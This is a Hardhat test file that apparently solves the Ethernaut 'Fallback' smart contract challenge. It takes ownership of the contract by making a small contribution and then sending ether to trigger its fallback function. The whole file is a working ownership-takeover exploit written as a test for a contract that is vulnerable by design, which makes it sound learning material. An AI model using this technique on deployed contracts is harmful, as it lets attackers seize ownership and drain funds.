import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
// eslint-disable-next-line node/no-missing-import
import { Fallback } from "../typechain";

interface FallbackContext {
  contract: Fallback;
  owner: SignerWithAddress;
  seller: SignerWithAddress;
  buyer: SignerWithAddress;
}

describe("Fallback", () => {
  let ctx: FallbackContext;
  beforeEach(async function () {
    const [owner, seller, buyer] = await ethers.getSigners();
    const Fallback = await ethers.getContractFactory("Fallback");
    const fallback = await Fallback.deploy();
    ctx = { contract: fallback, owner, seller, buyer };
  });

  it("Hack contact", async () => {
    const tokenAmount = 3;
    const txTransactionContribute = {
      value: tokenAmount,
    };
    await ctx.contract.connect(ctx.buyer).contribute(txTransactionContribute);
    const txTransaction = {
      value: tokenAmount,
      to: ctx.contract.address,
    };

    const tx = await ctx.buyer.sendTransaction(txTransaction);
    await tx.wait();
    expect(await ctx.contract.owner()).to.eq(ctx.buyer.address);
  });
});
